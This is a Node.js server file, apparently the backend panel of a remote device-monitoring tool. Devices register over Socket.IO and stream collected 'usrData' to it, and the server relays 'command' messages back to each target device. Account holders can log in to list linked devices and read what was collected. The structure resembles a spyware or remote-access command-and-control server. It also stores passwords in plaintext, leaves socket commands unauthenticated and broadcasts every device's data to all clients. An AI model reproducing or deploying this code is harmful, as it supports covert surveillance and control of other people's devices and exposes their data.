const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: { origin: '*' },
    pingTimeout: 60000,
    pingInterval: 25000
});

const PORT = process.env.PORT || 3000;

const users = {};
const deviceData = {};
const uidToEmail = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/register', (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.json({ ok: false, msg: 'Email and password required' });
    if (password.length < 8) return res.json({ ok: false, msg: 'Password must be 8+ chars' });
    if (users[email]) return res.json({ ok: false, msg: 'Email already registered' });
    users[email] = { password, uid: null, devices: [] };
    console.log('[REGISTER]', email);
    res.json({ ok: true, msg: 'Registered successfully' });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    if (!users[email]) return res.json({ ok: false, msg: 'Email not found' });
    if (users[email].password !== password) return res.json({ ok: false, msg: 'Wrong password' });
    const token = crypto.randomBytes(16).toString('hex');
    users[email].token = token;
    console.log('[LOGIN]', email);
    res.json({ ok: true, token, email });
});

app.get('/api/devices', (req, res) => {
    const { email, token } = req.query;
    if (!users[email] || users[email].token !== token) return res.json({ ok: false, msg: 'Unauthorized' });
    const list = (users[email].devices || []).map(uid => ({
        uid,
        info: deviceData[uid]?.info || {},
        online: !!deviceData[uid]?.socketId,
        dataCount: deviceData[uid]?.data?.length || 0
    }));
    res.json({ ok: true, devices: list });
});

app.get('/api/data', (req, res) => {
    const { email, token, uid } = req.query;
    if (!users[email] || users[email].token !== token) return res.json({ ok: false, msg: 'Unauthorized' });
    if (!deviceData[uid]) return res.json({ ok: true, data: [] });
    res.json({ ok: true, data: deviceData[uid].data });
});

io.on('connection', (socket) => {
    console.log('[SOCKET] Connected:', socket.id);

    socket.on('register', (payload) => {
        try {
            const data = typeof payload === 'string' ? JSON.parse(payload) : payload;
            const { email, uid, info } = data;
            if (!uid) return;
            if (!deviceData[uid]) deviceData[uid] = { socketId: socket.id, info: {}, data: [] };
            deviceData[uid].socketId = socket.id;
            deviceData[uid].info = info || {};
            if (email) {
                uidToEmail[uid] = email;
                if (!users[email]) users[email] = { password: '', devices: [] };
                if (!users[email].devices.includes(uid)) users[email].devices.push(uid);
            }
            console.log('[REGISTER DEVICE]', uid, 'for', email);
        } catch (e) { console.log('[REGISTER ERR]', e.message); }
    });

    socket.on('usrData', (payload) => {
        try {
            const data = typeof payload === 'string' ? JSON.parse(payload) : payload;
            const uid = data.uid || Object.keys(deviceData).find(k => deviceData[k].socketId === socket.id);
            if (!uid || !deviceData[uid]) return;
            const entry = { ...data, receivedAt: Date.now() };
            deviceData[uid].data.push(entry);
            if (deviceData[uid].data.length > 500) deviceData[uid].data.shift();
            io.emit('panel_update', { uid, data: entry });
            console.log('[DATA]', uid, data.dataType);
        } catch (e) { console.log('[DATA ERR]', e.message); }
    });

    socket.on('command', (payload) => {
        try {
            const { uid, command } = payload;
            if (!uid || !deviceData[uid]) return;
            const targetSocketId = deviceData[uid].socketId;
            if (!targetSocketId) return;
            io.to(targetSocketId).emit('commands', [payload]);
            console.log('[COMMAND]', uid, command);
        } catch (e) { console.log('[COMMAND ERR]', e.message); }
    });

    socket.on('disconnect', () => {
        for (const uid in deviceData) {
            if (deviceData[uid].socketId === socket.id) deviceData[uid].socketId = null;
        }
        console.log('[SOCKET] Disconnected:', socket.id);
    });
});

server.listen(PORT, () => console.log('Server running on port', PORT));
